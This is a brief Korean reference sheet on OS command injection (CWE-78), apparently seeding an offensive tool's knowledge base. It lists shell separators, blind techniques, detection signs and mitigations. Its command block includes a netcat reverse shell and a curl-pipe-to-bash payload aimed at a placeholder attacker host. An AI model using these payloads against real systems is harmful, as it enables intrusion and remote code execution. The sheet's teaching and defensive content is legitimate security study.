# 학습 시드(심화): command-injection

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn command-injection`. P1: 머신별 라이트업 미참조.

## 개요
OS 명령 주입: 입력이 셸 명령에 삽입되어 임의 명령 실행. CWE-78.

## 핵심 기법 · 열거
- 구분자: ; | & && || `cmd` $(cmd) 개행
- 블라인드: 시간지연(; sleep 5) / OOB(; nslookup <lhost>)
- 인자 주입·와일드카드 악용
- 활용: 역방향 셸 즉시 투입

## 표준 도구 · 명령
```
127.0.0.1; id
127.0.0.1 | nc <lhost> 4444 -e /bin/sh
$(curl http://<lhost>/s.sh|bash)
; ping -c1 <lhost>    # 블라인드 OOB 확인
```

## 블루팀 탐지
웹프로세스의 비정상 자식(sh/bash/nc/curl). 아웃바운드 DNS/ICMP 이상. 입력에 셸 메타문자.

## 완화
셸 미경유 API(execve 인자배열)·입력 허용목록·메타문자 거부·최소권한.

- 출처(검증): https://portswigger.net/web-security/os-command-injection
